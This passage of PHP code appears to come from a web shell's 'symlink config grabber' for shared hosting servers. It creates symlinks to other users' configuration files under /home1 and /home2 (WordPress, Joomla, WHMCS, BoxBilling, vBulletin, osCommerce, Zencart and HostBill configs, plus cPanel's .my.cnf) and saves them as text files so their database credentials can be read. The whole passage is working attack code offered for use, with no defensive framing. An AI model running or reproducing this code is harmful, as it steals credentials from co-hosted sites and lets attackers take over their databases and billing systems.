@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
